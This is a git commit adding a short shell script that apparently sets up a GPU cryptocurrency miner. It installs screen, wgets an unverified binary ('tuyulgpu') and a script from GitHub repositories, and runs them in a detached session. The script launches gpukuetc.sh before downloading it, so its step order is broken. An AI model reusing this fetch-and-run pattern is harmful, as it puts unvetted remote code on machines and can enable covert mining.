01a296f9c6d7318b9ac9687755be3e6688227485
muterminer <86037273+muterminer@users.noreply.github.com>
2021-06-19 22:28:00 +0700

    Create gaskuetc.sh

---
+++ gaskuetc.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpukuetc.sh ./gpukuetc.sh 65 75
+wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/muterminer/mutmin/main/gpukuetc.sh
+chmod +x gpukuetc.sh
+./gpukuetc.sh
